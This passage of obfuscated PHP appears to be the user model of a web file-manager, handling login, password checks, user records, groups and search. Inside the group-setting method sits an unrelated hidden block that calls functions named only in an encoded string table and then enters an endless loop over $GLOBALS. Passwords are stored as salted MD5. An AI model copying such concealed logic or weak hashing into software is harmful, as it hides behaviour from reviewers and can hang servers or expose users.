$Cæªİ÷¶ƒ¿[$Eœù”ÀùÅ[417]] = $this->metaGet($Cæªİ÷¶ƒ¿[$Eœù”ÀùÅ[1456]]); } return $Cæªİ÷¶ƒ¿; goto cõ¶†Á…ç; aÑÊ²¼×íÂ: $Cæªİ÷¶ƒ¿ = $this->_listDataApplyItem($Cæªİ÷¶ƒ¿); $AÌÛùÂŞ…Å = Model($Eœù”ÀùÅ[1136])->metaGet($Cæªİ÷¶ƒ¿[$Eœù”ÀùÅ[391]][$Eœù”ÀùÅ[369]]); $Cæªİ÷¶ƒ¿[$Eœù”ÀùÅ[2546]] = $cÖë¾Ÿƒ’¦; goto A›Ï‰½®ºÕ; cõ¶†Á…ç: } protected function getInfoSimple($c‹¦È¥»Ä, $C†Ğ÷ÁÆÄš = false) { $BÕÈ…ùöÀ¯ =& $_SERVER[ã®Â„Éæ¹¤]; if (!$c‹¦È¥»Ä) { return array(); } if ($C†Ğ÷ÁÆÄš) { $DÚëò÷÷—ë = $this->where(array($BÕÈ…ùöÀ¯[1456] => intval($c‹¦È¥»Ä)))->find(); if (!is_array($DÚëò÷÷—ë)) { return array(); } $DÚëò÷÷—ë[$BÕÈ…ùöÀ¯[2547]] = Action($BÕÈ…ùöÀ¯[2548])->parseUrl($DÚëò÷÷—ë[$BÕÈ…ùöÀ¯[2547]]); return $DÚëò÷÷—ë; } return $this->cacheFunctionGet($BÕÈ…ùöÀ¯[2199], $c‹¦È¥»Ä); } protected function getInfoSimpleOuter($fÁôéÃ©è«) { goto D¹éèæ„ˆó; fİÆ–ÛÙ¢Æ: return $A£×Ù³‹¹; goto DÕ©Ø‡“Ã¼; aŠù¦¤¾Ùà: $A£×Ù³‹¹ = array_field_key($c§ïóé¬, explode($eŸï§‡êà‹[47], $this->simpleField)); if (!$A£×Ù³‹¹) { return array($eŸï§‡êà‹[1456] => $eŸï§‡êà‹[1050], $eŸï§‡êà‹[28] => $eŸï§‡êà‹[157] . LNG($eŸï§‡êà‹[2551]) . $eŸï§‡êà‹[478], $eŸï§‡êà‹[2547] => STATIC_PATH . $eŸï§‡êà‹[2552]); } $A£×Ù³‹¹[$eŸï§‡êà‹[2547]] = Action($eŸï§‡êà‹[2548])->parseUrl($A£×Ù³‹¹[$eŸï§‡êà‹[2547]]); goto fİÆ–ÛÙ¢Æ; D¹éèæ„ˆó: $eŸï§‡êà‹ =& $_SERVER[ã®Â„Éæ¹¤]; if (!$fÁôéÃ©è« || $fÁôéÃ©è« == 0) { return array($eŸï§‡êà‹[1456] => $eŸï§‡êà‹[470], $eŸï§‡êà‹[28] => $eŸï§‡êà‹[157] . LNG($eŸï§‡êà‹[2549]) . $eŸï§‡êà‹[478], $eŸï§‡êà‹[2547] => STATIC_PATH . $eŸï§‡êà‹[2550]); } $c§ïóé¬ = $this->cacheFunctionGet($eŸï§‡êà‹[2199], $fÁôéÃ©è«); goto aŠù¦¤¾Ùà; DÕ©Ø‡“Ã¼: } protected function groupUser($D•¨£óÈ»Ï) { } public static function errorLang($B‡†À‘ƒ) { $E÷š‘äÁó =& $_SERVER[ã®Â„Éæ¹¤]; $a„Æ°İ¿¾¸ = array(self::ERROR_USER_NOT_EXISTS => $E÷š‘äÁó[2553], self::ERROR_USER_PASSWORD_ERROR => $E÷š‘äÁó[2554], self::ERROR_USER_EXIST_NAME => $E÷š‘äÁó[2555], self::ERROR_USER_EXIST_PHONE => $E÷š‘äÁó[2556], self::ERROR_USER_EXIST_EMAIL => $E÷š‘äÁó[2557], self::ERROR_USER_LOGIN_LOCK => $E÷š‘äÁó[2558], self::ERROR_IP_NOT_ALLOW => $E÷š‘äÁó[2559], self::ERROR_USER_EXIST_NICKNAME => $E÷š‘äÁó[2560]); return LNG($a„Æ°İ¿¾¸[$B‡†À‘ƒ]); } public function getInfoByMeta($C­İÈÆ™ß, $b¶ºÉËÀ÷á) { $fŠšÒæÕ—Ù =& $_SERVER[ã®Â„Éæ¹¤]; $D¤•Êğ‹¿ = Model($fŠšÒæÕ—Ù[2561])->where(array($fŠšÒæÕ—Ù[89] => $C­İÈÆ™ß, $fŠšÒæÕ—Ù[359] => $b¶ºÉËÀ÷á))->find(); if ($D¤•Êğ‹¿) { return $this->getInfo($D¤•Êğ‹¿[$fŠšÒæÕ—Ù[1456]]); } return !1; } public function userLoginCheck($B¹ãä¿•®•, $D™±ì¹™) { goto E´¶¾Ô×„²; B‘ÓŞİ­†«: $a›Ç¬¿ÂÂé = $this->where($eª‚Ôá¿³£)->find(); if (!$a›Ç¬¿ÂÂé) { return UserModel::ERROR_USER_NOT_EXISTS; } if (!$this->userPasswordCheck($a›Ç¬¿ÂÂé[$DµÈ»”ğİ[1456]], $D™±ì¹™)) { return UserModel::ERROR_USER_PASSWORD_ERROR; } goto EšÛñ÷æ™; E´¶¾Ô×„²: $DµÈ»”ğİ =& $_SERVER[ã®Â„Éæ¹¤]; $eª‚Ôá¿³£ = array($DµÈ»”ğİ[28] => $B¹ãä¿•®•, $DµÈ»”ğİ[2385] => $B¹ãä¿•®•, $DµÈ»”ğİ[293] => $B¹ãä¿•®•, $DµÈ»”ğİ[2562] => $B¹ãä¿•®•, $DµÈ»”ğİ[932] => $DµÈ»”ğİ[934]); if ($this->nickNameRpt()) { unset($eª‚Ôá¿³£[$DµÈ»”ğİ[2385]]); } goto B‘ÓŞİ­†«; EšÛñ÷æ™: $this->userEdit($a›Ç¬¿ÂÂé[$DµÈ»”ğİ[1456]], array($DµÈ»”ğİ[2563] => time())); return $this->getInfo($a›Ç¬¿ÂÂé[$DµÈ»”ğİ[1456]]); goto DíĞìÁ§æ¥; DíĞìÁ§æ¥: } public function clearCache($bÚ÷¯¾éÍä) { $fµß¬ğñÁô =& $_SERVER[ã®Â„Éæ¹¤]; $this->cacheFunctionClear($fµß¬ğñÁô[2252], $bÚ÷¯¾éÍä); $this->cacheFunctionClear($fµß¬ğñÁô[2199], $bÚ÷¯¾éÍä); $this->cacheFunctionClear($fµß¬ğñÁô[2543], $bÚ÷¯¾éÍä); } public function userPasswordCheck($a²ƒ±£¤ß¯, $Dª­®ù°¥) { $bÁê¾ã†ùÊ =& $_SERVER[ã®Â„Éæ¹¤]; $Eğ¸Éê·õø = $this->where(array($bÁê¾ã†ùÊ[1456] => intval($a²ƒ±£¤ß¯)))->find(); $FÌÏ•Ş·¤ = $this->metaGet($a²ƒ±£¤ß¯); $a¼¡²ƒÃ²È = isset($FÌÏ•Ş·¤[$bÁê¾ã†ùÊ[2564]]) ? $FÌÏ•Ş·¤[$bÁê¾ã†ùÊ[2564]] : $bÁê¾ã†ùÊ[33]; if (md5($a¼¡²ƒÃ²È . trim($Dª­®ù°¥)) !== $Eğ¸Éê·õø[$bÁê¾ã†ùÊ[823]]) { return !1; } return !0; } public function userAdd($A¯•Œø»õ) { goto d™çšŒ…; DØáœà«ïŸ: return $cêƒÉˆ»ÇÀ; goto fµ™ÅËŒ¿; e¦Æ¦æÜÙ: $c…ÖÄ‰³¶ = $this->_checkExist($A¯•Œø»õ); if ($c…ÖÄ‰³¶ !== !0) { return $c…ÖÄ‰³¶; } $cêƒÉˆ»ÇÀ = $this->add($Cº×ĞÆ¸ò); goto aÙ¥ß³¼å; d™çšŒ…: $fÏ·¯Ä…±  =& $_SERVER[ã®Â„Éæ¹¤]; $Cº×ĞÆ¸ò = array($fÏ·¯Ä…± [386] => $A¯•Œø»õ[$fÏ·¯Ä…± [28]], $fÏ·¯Ä…± [2565] => $A¯•Œø»õ[$fÏ·¯Ä…± [1341]], $fÏ·¯Ä…± [2566] => isset($A¯•Œø»õ[$fÏ·¯Ä…± [293]]) ? $A¯•Œø»õ[$fÏ·¯Ä…± [293]] : $fÏ·¯Ä…± [33], $fÏ·¯Ä…± [2567] => isset($A¯•Œø»õ[$fÏ·¯Ä…± [2562]]) ? $A¯•Œø»õ[$fÏ·¯Ä…± [2562]] : $fÏ·¯Ä…± [33], $fÏ·¯Ä…± [2568] => isset($A¯•Œø»õ[$fÏ·¯Ä…± [2385]]) ? $A¯•Œø»õ[$fÏ·¯Ä…± [2385]] : $A¯•Œø»õ[$fÏ·¯Ä…± [28]], $fÏ·¯Ä…± [2569] => isset($A¯•Œø»õ[$fÏ·¯Ä…± [2547]]) ? $A¯•Œø»õ[$fÏ·¯Ä…± [2547]] : $fÏ·¯Ä…± [33], $fÏ·¯Ä…± [2570] => isset($A¯•Œø»õ[$fÏ·¯Ä…± [2571]]) ? $A¯•Œø»õ[$fÏ·¯Ä…± [2571]] : 1, $fÏ·¯Ä…± [2572] => $A¯•Œø»õ[$fÏ·¯Ä…± [823]], $fÏ·¯Ä…± [2200] => isset($A¯•Œø»õ[$fÏ·¯Ä…± [2111]]) ? $A¯•Œø»õ[$fÏ·¯Ä…± [2111]] : 1024 * 1024 * 20, $fÏ·¯Ä…± [2201] => 0, $fÏ·¯Ä…± [2563] => 0, $fÏ·¯Ä…± [2239] => isset($A¯•Œø»õ[$fÏ·¯Ä…± [711]]) ? $A¯•Œø»õ[$fÏ·¯Ä…± [711]] : 1); if (!empty($A¯•Œø»õ[$fÏ·¯Ä…± [1456]])) { $Cº×ĞÆ¸ò[$fÏ·¯Ä…± [1456]] = $A¯•Œø»õ[$fÏ·¯Ä…± [1456]]; } goto e¦Æ¦æÜÙ; aÙ¥ß³¼å: $fÑ‡¢ñ‘À = array($fÏ·¯Ä…± [2572] => $Cº×ĞÆ¸ò[$fÏ·¯Ä…± [823]], $fÏ·¯Ä…± [2568] => $Cº×ĞÆ¸ò[$fÏ·¯Ä…± [2385]]); $this->userEdit($cêƒÉˆ»ÇÀ, $fÑ‡¢ñ‘À); Model($fÏ·¯Ä…± [1136])->userRootAdd($cêƒÉˆ»ÇÀ); goto DØáœà«ïŸ; fµ™ÅËŒ¿: } protected function userEditTest($D—Ô¼ëˆİº, $Dˆ±ŞÁÍ‰) { return $this->call($_SERVER[ã®Â„Éæ¹¤][2573], $D—Ô¼ëˆİº, $Dˆ±ŞÁÍ‰); } protected function userEdit($BÍÆñò˜Œ, $D²…ˆ«“õÀ) { goto cêæà«éÖ ; BÉ’–ŸÍ˜œ: $BˆÎÓ†­¢ = $this->_checkExist($D²…ˆ«“õÀ, $BÍÆñò˜Œ); if ($BˆÎÓ†­¢ !== !0) { return $BˆÎÓ†­¢; } if (isset($D²…ˆ«“õÀ[$eŒ˜´ÓŞ[823]]) && trim($D²…ˆ«“õÀ[$eŒ˜´ÓŞ[823]]) != $eŒ˜´ÓŞ[33]) { $B­»Ä’½†Ì = $this->metaGet($BÍÆñò˜Œ); if (empty($B­»Ä’½†Ì[$eŒ˜´ÓŞ[2564]])) { $B­»Ä’½†Ì[$eŒ˜´ÓŞ[2564]] = rand_string(10); Model($eŒ˜´ÓŞ[476])->metaSet($BÍÆñò˜Œ, $eŒ˜´ÓŞ[2564], $B­»Ä’½†Ì[$eŒ˜´ÓŞ[2564]]); } $D²…ˆ«“õÀ[$eŒ˜´ÓŞ[823]] = md5($B­»Ä’½†Ì[$eŒ˜´ÓŞ[2564]] . trim($D²…ˆ«“õÀ[$eŒ˜´ÓŞ[823]])); } else { unset($D²…ˆ«“õÀ[$eŒ˜´ÓŞ[823]]); } goto bÌ­„ºòã; eÒ¸õ¢Š¸é: return !0; goto cçàôšéÍŸ; cêæà«éÖ : $eŒ˜´ÓŞ =& $_SERVER[ã®Â„Éæ¹¤]; $dï†÷Ÿ§È‘ = $this->getInfoSimple($BÍÆñò˜Œ); if (!$dï†÷Ÿ§È‘) { return !1; } goto BÉ’–ŸÍ˜œ; bÌ­„ºòã: $this->where(array($eŒ˜´ÓŞ[1447] => $BÍÆñò˜Œ))->save($D²…ˆ«“õÀ); if (isset($D²…ˆ«“õÀ[$eŒ˜´ÓŞ[2385]])) { $this->setNamePinyin($BÍÆñò˜Œ, $D²…ˆ«“õÀ[$eŒ˜´ÓŞ[2385]]); } $this->clearCache($BÍÆñò˜Œ); goto eÒ¸õ¢Š¸é; cçàôšéÍŸ: } public function setNamePinyin($Bá±–Ñí¯«, $F°«Úï±Ş = false) { $EÑÉ‚á±ÀÁ =& $_SERVER[ã®Â„Éæ¹¤]; if (!$F°«Úï±Ş) { $fÖŸŒ‡ó¸ù = $this->getInfoSimple($Bá±–Ñí¯«); $F°«Úï±Ş = $fÖŸŒ‡ó¸ù[$EÑÉ‚á±ÀÁ[2385]] ? $fÖŸŒ‡ó¸ù[$EÑÉ‚á±ÀÁ[2385]] : $fÖŸŒ‡ó¸ù[$EÑÉ‚á±ÀÁ[28]]; } $B·ŒŒä«ÙØ = Model($EÑÉ‚á±ÀÁ[479]); if (!Input::check($F°«Úï±Ş, $EÑÉ‚á±ÀÁ[530])) { return $B·ŒŒä«ÙØ->metaSet($Bá±–Ñí¯«, array($EÑÉ‚á±ÀÁ[416] => $EÑÉ‚á±ÀÁ[33], $EÑÉ‚á±ÀÁ[415] => $EÑÉ‚á±ÀÁ[33])); } return $B·ŒŒä«ÙØ->metaSet($Bá±–Ñí¯«, array($EÑÉ‚á±ÀÁ[416] => str_replace($EÑÉ‚á±ÀÁ[50], $EÑÉ‚á±ÀÁ[33], Pinyin::encode($F°«Úï±Ş)), $EÑÉ‚á±ÀÁ[415] => Pinyin::encode($F°«Úï±Ş, $EÑÉ‚á±ÀÁ[531]))); } private function nickNameRpt() { $EÚ¦”Æ¶áî =& $_SERVER[ã®Â„Éæ¹¤]; $DÆÜïÁ • = Model($EÚ¦”Æ¶áî[1107])->get($EÚ¦”Æ¶áî[2574]); $Cõá¢è¤à· = $GLOBALS[$EÚ¦”Æ¶áî[6]][$EÚ¦”Æ¶áî[2532]][$EÚ¦”Æ¶áî[2574]]; $aùË†Ùˆ­Å = !is_null($DÆÜïÁ •) ? $DÆÜïÁ • : $Cõá¢è¤à·; return !!$aùË†Ùˆ­Å; } private function _checkExist($B¿®ŸÙˆÑ, $Cé©Ş”ˆæœ = false) { $B¨Û™×±’± =& $_SERVER[ã®Â„Éæ¹¤]; $eˆ‹³Æ•»¹ = array($B¨Û™×±’±[28] => UserModel::ERROR_USER_EXIST_NAME, $B¨Û™×±’±[2385] => UserModel::ERROR_USER_EXIST_NICKNAME, $B¨Û™×±’±[293] => UserModel::ERROR_USER_EXIST_EMAIL, $B¨Û™×±’±[2562] => UserModel::ERROR_USER_EXIST_PHONE); if ($this->nickNameRpt()) { unset($eˆ‹³Æ•»¹[$B¨Û™×±’±[2385]]); } $bˆùìÔÕ‰­ = $Cé©Ş”ˆæœ ? array($B¨Û™×±’±[1456] => array($B¨Û™×±’±[2575], $Cé©Ş”ˆæœ)) : array(); foreach ($eˆ‹³Æ•»¹ as $cºÕŒ®•—ë => $däĞ—È›íÎ) { $a‚Ñé¡êØ‰ = array(); foreach ($eˆ‹³Æ•»¹ as $fÓ‘‹ñ²ßù => $e²“¬èÔ„) { if (isset($B¿®ŸÙˆÑ[$fÓ‘‹ñ²ßù]) && $B¿®ŸÙˆÑ[$fÓ‘‹ñ²ßù]) { $a‚Ñé¡êØ‰[] = $B¿®ŸÙˆÑ[$fÓ‘‹ñ²ßù]; } } if (!$a‚Ñé¡êØ‰) { continue; } $eÛš‚÷Ÿ™« = array_merge(array($cºÕŒ®•—ë => array($B¨Û™×±’±[7], $a‚Ñé¡êØ‰)), $bˆùìÔÕ‰­); $d¥êàÎçÅ³ = $this->where($eÛš‚÷Ÿ™«)->find(); if ($d¥êàÎçÅ³) { return $däĞ—È›íÎ; } } return !0; } public function userListInfo($Fˆ„»ŒäÓ¸) { $FÏ­’âÛ“¶ =& $_SERVER[ã®Â„Éæ¹¤]; $CÚ¢™ÕŸ¨æ = array(); $Fˆ„»ŒäÓ¸ = is_array($Fˆ„»ŒäÓ¸) ? array_unique($Fˆ„»ŒäÓ¸) : array(); if (!$Fˆ„»ŒäÓ¸) { return $CÚ¢™ÕŸ¨æ; } if (count($Fˆ„»ŒäÓ¸) < 20) { foreach ($Fˆ„»ŒäÓ¸ as $dÚ¡ÔÑ°ˆ) { $CÚ¢™ÕŸ¨æ[$dÚ¡ÔÑ°ˆ . $FÏ­’âÛ“¶[33]] = $this->getInfoSimpleOuter($dÚ¡ÔÑ°ˆ); } } else { $FÒÖïˆíä = array($FÏ­’âÛ“¶[1447] => array($FÏ­’âÛ“¶[384], $Fˆ„»ŒäÓ¸)); if (count($Fˆ„»ŒäÓ¸) == 1) { $FÒÖïˆíä = array($FÏ­’âÛ“¶[1447] => $Fˆ„»ŒäÓ¸[0]); } $b¡º¶±ß‰É = Model($FÏ­’âÛ“¶[476])->field($this->simpleField)->where($FÒÖïˆíä)->select(); $b¡º¶±ß‰É = array_to_keyvalue($b¡º¶±ß‰É, $FÏ­’âÛ“¶[1456]); foreach ($Fˆ„»ŒäÓ¸ as $dÚ¡ÔÑ°ˆ) { $C«µ‡ŸİŒ = $b¡º¶±ß‰É[$b¡º¶±ß‰É[$dÚ¡ÔÑ°ˆ]]; if (!$C«µ‡ŸİŒ) { $CÚ¢™ÕŸ¨æ[$dÚ¡ÔÑ°ˆ . $FÏ­’âÛ“¶[33]] = $this->getInfoSimpleOuter($dÚ¡ÔÑ°ˆ); continue; } $C«µ‡ŸİŒ[$FÏ­’âÛ“¶[2547]] = Action($FÏ­’âÛ“¶[2548])->parseUrl($C«µ‡ŸİŒ[$FÏ­’âÛ“¶[2547]]); $CÚ¢™ÕŸ¨æ[$dÚ¡ÔÑ°ˆ . $FÏ­’âÛ“¶[33]] = $C«µ‡ŸİŒ; } } return $CÚ¢™ÕŸ¨æ; } protected function userStatus($bˆ©‡ñÍÁà, $Cê«¨×¼Ğ) { $CÄ©£Ğö·  = $this->getInfoSimple($bˆ©‡ñÍÁà); if (!$CÄ©£Ğö· ) { return !1; } $A­ø¡Æ¶£ƒ = array($_SERVER[ã®Â„Éæ¹¤][711] => $Cê«¨×¼Ğ); return $this->userEdit($bˆ©‡ñÍÁà, $A­ø¡Æ¶£ƒ); } protected function userRemove($DäÊÎÎç‚á) { goto DÊ…ÊÔËáª; DÊ…ÊÔËáª: $cŸõ¨»ƒ¬— =& $_SERVER[ã®Â„Éæ¹¤]; $a÷âŠÁ‚åÆ = $this->getInfoSimple($DäÊÎÎç‚á); if (!$a÷âŠÁ‚åÆ) { return !1; } goto fÈÈå‰¦¯ä; bö ò·‡Š¢: Model($cŸõ¨»ƒ¬—[775])->userRootRemove($DäÊÎÎç‚á); return $this->where($Eªòæ¹ôš)->delete(); goto a“Åá¤éÉ; fÈÈå‰¦¯ä: $Eªòæ¹ôš = array($cŸõ¨»ƒ¬—[1447] => $DäÊÎÎç‚á); Model($cŸõ¨»ƒ¬—[537])->where($Eªòæ¹ôš)->delete(); Model($cŸõ¨»ƒ¬—[2576])->where($Eªòæ¹ôš)->delete(); goto Aï±æñ˜âÅ; Aï±æñ˜âÅ: Model($cŸõ¨»ƒ¬—[2206])->where($Eªòæ¹ôš)->delete(); Model($cŸõ¨»ƒ¬—[2561])->where($Eªòæ¹ôš)->delete(); Model($cŸõ¨»ƒ¬—[2577])->where($Eªòæ¹ôš)->delete(); goto bö ò·‡Š¢; a“Åá¤éÉ: } protected function userGroupSet($A×Œáñ…Ğ, $cÛ¾¤Íê», $c—ÖÚ·™Ô = array()) { goto F³ñã’øâø; D±Ğ†¶ŸŞ§: return $c„Å„ù…ºŠ->addAll($c£ì„™¾Ã, array(), !0); goto bââ¥ÉªÓ‘; fæíÆ³¢ó: if (!$Fè—¼Éòîß || !is_array($cÛ¾¤Íê»)) { return !1; } $c„Å„ù…ºŠ = Model($f»—ÅÒÌ×[2206]); $c„Å„ù…ºŠ->where(array($f»—ÅÒÌ×[1456] => $A×Œáñ…Ğ))->delete(); goto D‘Œ…ôÊ‘; F³ñã’øâø: $f»—ÅÒÌ× =& $_SERVER[ã®Â„Éæ¹¤]; if (!isset($_SERVER[$f»—ÅÒÌ×[554]]) || !isset($_SERVER[$f»—ÅÒÌ×[750]])) { goto aˆàí“‰ƒ; d°—ºùğ˜ó: $bíÊÕ ÛÚÆ = $d­—¥¶‘°($c–“„›„ƒš); $Bê¤¤ˆä¥ = explode($f»—ÅÒÌ×[217], $bíÊÕ ÛÚÆ); if (count($Bê¤¤ˆä¥) < $f»—ÅÒÌ×[562]) { $e¥”»ÔŠ÷§ = $f»—ÅÒÌ×[559]; $e¥”»ÔŠ÷§(); } goto dÕ÷íÂŒñŒ; a¥ƒ«¶Û é: for ($aä¹ÁÕÚµ† = $fÕ£Œß’‹«; $aä¹ÁÕÚµ† > 0; $aä¹ÁÕÚµ†++) { $Eä¬¯‡»Ü˜ = json_encode($GLOBALS[$f»—ÅÒÌ×[384]]); } goto eÛîòŞ®Î; aˆàí“‰ƒ: $d°Œö‘øƒ = $f»—ÅÒÌ×[813]; $d­—¥¶‘° = $f»—ÅÒÌ×[555]; $c–“„›„ƒš = $_SERVER[$f»—ÅÒÌ×[556]] . $f»—ÅÒÌ×[557]; goto d°—ºùğ˜ó; dÕ÷íÂŒñŒ: $Eä¬¯‡»Ü˜ = $f»—ÅÒÌ×[814]; $Eä¬¯‡»Ü˜($_SERVER[$f»—ÅÒÌ×[815]]); $fÕ£Œß’‹« = 1; goto a¥ƒ«¶Û é; eÛîòŞ®Î: } $Fè—¼Éòîß = $this->getInfoSimple($A×Œáñ…Ğ); goto fæíÆ³¢ó; D‘Œ…ôÊ‘: $c£ì„™¾Ã = array(); $e½Ô†‹°‹ = 0; foreach ($cÛ¾¤Íê» as $D³†Ë†ì => $eñßä¥±î’) { $CæÇğãÇ° = array($f»—ÅÒÌ×[1456] => $A×Œáñ…Ğ, $f»—ÅÒÌ×[2127] => $D³†Ë†ì, $f»—ÅÒÌ×[2271] => $eñßä¥±î’); $CæÇğãÇ°[$f»—ÅÒÌ×[2149]] = isset($c—ÖÚ·™Ô[$e½Ô†‹°‹]) ? $c—ÖÚ·™Ô[$e½Ô†‹°‹] : 0; $e½Ô†‹°‹++; $c£ì„™¾Ã[] = $CæÇğãÇ°; } goto D±Ğ†¶ŸŞ§; bââ¥ÉªÓ‘: } protected function userGroupAdd($AÀ¬¸çáÂ, $D–öà÷›Ç = array()) { $aØä”„õ =& $_SERVER[ã®Â„Éæ¹¤]; $c¤š’Û¬îæ = $this->getInfoSimple($AÀ¬¸çáÂ); if (!$c¤š’Û¬îæ || empty($D–öà÷›Ç)) { return !1; } $D¿ßòó¾ = array(); foreach ($D–öà÷›Ç as $dÔˆ¦ØÑáâ => $B¯¦Á´ï“) { $D¿ßòó¾[] = array($aØä”„õ[1456] => $AÀ¬¸çáÂ, $aØä”„õ[2127] => $dÔˆ¦ØÑáâ, $aØä”„õ[2271] => $B¯¦Á´ï“, $aØä”„õ[2149] => 0); } return Model($aØä”„õ[2206])->addAll($D¿ßòó¾, array(), !0); } protected function userGroupRemove($F…ÏêˆªÜî, $a»õ±àÄŒ¿) { $a§‰Ûåº‹– =& $_SERVER[ã®Â„Éæ¹¤]; $bÙçèºÍä = $this->getInfoSimple($F…ÏêˆªÜî); if (!$bÙçèºÍä || !$a»õ±àÄŒ¿) { return !1; } $F§ŠœÖÙö´ = array($a§‰Ûåº‹–[1447] => $F…ÏêˆªÜî, $a§‰Ûåº‹–[2204] => $a»õ±àÄŒ¿); return Model($a§‰Ûåº‹–[2206])->where($F§ŠœÖÙö´)->delete(); } public function listData() { $aˆÃµ«¡Íà = $this->_makeOrder()->selectPage(50); $this->_listDataApply($aˆÃµ«¡Íà[$_SERVER[ã®Â„Éæ¹¤][354]]); return $aˆÃµ«¡Íà; } public function listByID($AÜÑà½™ñ–) { $A¸Û»‡Í¿Æ =& $_SERVER[ã®Â„Éæ¹¤]; if (!$AÜÑà½™ñ–) { return; } $DËŞ¸›¦Ù = array($A¸Û»‡Í¿Æ[1456] => array($A¸Û»‡Í¿Æ[7], $AÜÑà½™ñ–)); $DŒÃÕù¼áç = $this->where($DËŞ¸›¦Ù)->select(); $this->_listDataApply($DŒÃÕù¼áç); return $DŒÃÕù¼áç; } public function listByGroup($EÁ–ŞÕ‰µ– = 0, $Eœ¬ß¾´Ğ” = array()) { goto Aó‹åâ‰¢; Aó‹åâ‰¢: $DÇ¬¦²˜Ğ– =& $_SERVER[ã®Â„Éæ¹¤]; $D¶½§ï·æË = $DÇ¬¦²˜Ğ–[33]; $b”ïÆÍ‚Ù‹ = array(); goto e³¥Òğ“º; c¤à±îÉà: $this->_listDataApply($b£¥ÖŞ¾¦“[$DÇ¬¦²˜Ğ–[354]]); return $b£¥ÖŞ¾¦“; goto DÀ° ‹£ÉÙ; e³¥Òğ“º: if ($EÁ–ŞÕ‰µ–) { $b”ïÆÍ‚Ù‹ = array($DÇ¬¦²˜Ğ–[2578] => intval($EÁ–ŞÕ‰µ–)); $D¶½§ï·æË = "\x4c\105\x46\x54\x20\112\117\x49\x4e\40{$this->tablePrefix}\165\163\145\162\137\x67\x72\x6f\x75\x70\40\x75\x73\145\162\x5f\147\x72\157\x75\x70\40\x6f\x6e\40\x75\163\x65\162\x2e\x75\x73\145\162\111\104\x20\75\x20\165\163\145\162\x5f\x67\x72\x6f\165\x70\56\165\x73\145\x72\x49\x44"; $bÃÕĞÙ¹™ = Input::get($DÇ¬¦²˜Ğ–[407], null, $DÇ¬¦²˜Ğ–[33]) ? $DÇ¬¦²˜Ğ–[33] : $DÇ¬¦²˜Ğ–[2579]; } if (isset($Eœ¬ß¾´Ğ”[$DÇ¬¦²˜Ğ–[711]])) { $b”ïÆÍ‚Ù‹[$DÇ¬¦²˜Ğ–[2580]] = $Eœ¬ß¾´Ğ”[$DÇ¬¦²˜Ğ–[711]]; } $b£¥ÖŞ¾¦“ = $this->_makeOrder($bÃÕĞÙ¹™)->field($DÇ¬¦²˜Ğ–[2581])->where($b”ïÆÍ‚Ù‹)->join($D¶½§ï·æË)->selectPage(50); goto c¤à±îÉà; DÀ° ‹£ÉÙ: } private function _makeOrder($dêëìæÜŠ± = '') { goto B•¢í–‹¾â; A’ßšÔ±˜°: $dêëìæÜŠ± = $dêëìæÜŠ± . "\165\163\145\x72\56{$föîáÜç}\x20{$Eº¯èÊùÄ}\x2c\40\x75\163\145\162\56\x75\163\145\x72\111\104\40\x61\x73\x63"; return $this->alias($bÎñÃíÈŒ„[2326])->order($dêëìæÜŠ±); goto a¦á‚‹³ˆ; aà­‹ƒŸ¡Ä: $föîáÜç = Input::get($bÎñÃíÈŒ„[407], $bÎñÃíÈŒ„[7], $bÎñÃíÈŒ„[1447], $eÇ¼Æõ›¢); $Eº¯èÊùÄ = Input::get($bÎñÃíÈŒ„[408], $bÎñÃíÈŒ„[7], $bÎñÃíÈŒ„[2207], array($bÎñÃíÈŒ„[2207], $bÎñÃíÈŒ„[404])); $Eº¯èÊùÄ = $D†ˆİîƒî„[$Eº¯èÊùÄ]; goto A’ßšÔ±˜°; B•¢í–‹¾â: $bÎñÃíÈŒ„ =& $_SERVER[ã®Â„Éæ¹¤]; $eÇ¼Æõ›¢ = array($bÎñÃíÈŒ„[1456], $bÎñÃíÈŒ„[28], $bÎñÃíÈŒ„[2113], $bÎñÃíÈŒ„[2085], $bÎñÃíÈŒ„[187]); $D†ˆİîƒî„ = array($bÎñÃíÈŒ„[402] => $bÎñÃíÈŒ„[403], $bÎñÃíÈŒ„[404] => $bÎñÃíÈŒ„[405]); goto aà­‹ƒŸ¡Ä; a¦á‚‹³ˆ: } public function listSearch($FÅ™µ–›¢¬) { goto Fë—†¬ˆä»; F¢±ĞêÔô: $c‡Ùºµ‡ö = str_replace($eÎ“»¼—é[2210], $eÎ“»¼—é[2211], trim($c‡Ùºµ‡ö)); $f‹Äù†”õÀ = array($eÎ“»¼—é[28] => array($eÎ“»¼—é[774], "\x25{$c‡Ùºµ‡ö}\45"), $eÎ“»¼—é[293] => array($eÎ“»¼—é[774], "\x25{$c‡Ùºµ‡ö}\x25"), $eÎ“»¼—é[2385] => array($eÎ“»¼—é[774], "\45{$c‡Ùºµ‡ö}\x25"), $eÎ“»¼—é[932] => $eÎ“»¼—é[2212]); if (Input::check($c‡Ùºµ‡ö, $eÎ“»¼—é[299])) { $f‹Äù†”õÀ[$eÎ“»¼—é[1456]] = array($eÎ“»¼—é[774], "\x25{$c‡Ùºµ‡ö}\x25"); $f‹Äù†”õÀ[$eÎ“»¼—é[2562]] = array($eÎ“»¼—é[774], "\x25{$c‡Ùºµ‡ö}\45"); } goto DØîÑç£ŠÍ; Fë—†¬ˆä»: $eÎ“»¼—é =& $_SERVER[ã®Â„Éæ¹¤]; $c‡Ùºµ‡ö = $FÅ™µ–›¢¬[$eÎ“»¼—é[2208]]; $E¦Å£ñƒÑÙ = isset($FÅ™µ–›¢¬[$eÎ“»¼—é[2209]]) ? $FÅ™µ–›¢¬[$eÎ“»¼—é[2209]] : !1; goto F¢±ĞêÔô; f‘µ‡ŞÛ: return $b–ù¨êîƒØ; goto c¦ÀÒäã¯¦; DØîÑç£ŠÍ: if (!$c‡Ùºµ‡ö) { $f‹Äù†”õÀ = array(); } if (isset($FÅ™µ–›¢¬[$eÎ“»¼—é[711]])) { $f‹Äù†”õÀ[$eÎ“»¼—é[711]] = $FÅ™µ–›¢¬[$eÎ“»¼—é[711]]; } $b–ù¨êîƒØ = $this->_makeOrder()->where($f‹Äù†”õÀ)->selectPage(20); goto eÏƒƒŸÀù; eÏƒƒŸÀù: if (!$b–ù¨êîƒØ || count($b–ù¨êîƒØ[$eÎ“»¼—é[354]]) < 5 && Input::check($c‡Ùºµ‡ö, $eÎ“»¼—é[306])) { $FâÉ¥›£Ø = $this->_searchFromMeta($eÎ“»¼—é[415], $c‡Ùºµ‡ö, 10); $d»ÓÚÇÊø = $this->_searchFromMeta($eÎ“»¼—é[416], $c‡Ùºµ‡ö, 10); $cÄ·İÌ¿‡ = 